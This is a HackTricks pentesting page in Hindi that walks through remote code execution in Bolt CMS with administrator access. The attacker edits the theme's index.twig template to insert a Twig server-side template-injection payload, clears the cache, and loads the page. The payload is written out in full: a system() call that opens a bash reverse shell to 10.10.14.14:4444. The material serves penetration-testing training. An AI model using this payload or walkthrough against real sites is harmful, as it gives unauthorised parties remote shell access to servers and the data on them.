# Bolt CMS

{{#include ../../banners/hacktricks-training.md}}

## RCE

प्रशासक के रूप में लॉगिन करने के बाद (लॉगिन प्रॉम्प्ट तक पहुँचने के लिए /bot पर जाएँ), आप Bolt CMS में RCE प्राप्त कर सकते हैं:

- `Configuration` -> `View Configuration` -> `Main Configuration` चुनें या URL पथ `/bolt/file-edit/config?file=/bolt/config.yaml` पर जाएँ
- थीम का मान जांचें

<figure><img src="../../images/image (771).png" alt=""><figcaption></figcaption></figure>

- `File management` -> `View & edit templates` चुनें
- पिछले चरण में पाए गए थीम बेस (इस मामले में `base-2021`) का चयन करें और `index.twig` चुनें
- मेरे मामले में यह URL पथ /bolt/file-edit/themes?file=/base-2021/index.twig में है
- इस फ़ाइल में अपने पेलोड को [template injection (Twig)](../../pentesting-web/ssti-server-side-template-injection/index.html#twig-php) के माध्यम से सेट करें, जैसे: `{{['bash -c "bash -i >& /dev/tcp/10.10.14.14/4444 0>&1"']|filter('system')}}`
- और परिवर्तनों को सहेजें

<figure><img src="../../images/image (948).png" alt=""><figcaption></figcaption></figure>

- `Maintenance` -> `Clear the cache` में कैश साफ़ करें
- फिर से एक सामान्य उपयोगकर्ता के रूप में पृष्ठ तक पहुँचें, और पेलोड निष्पादित होना चाहिए

{{#include ../../banners/hacktricks-training.md}}
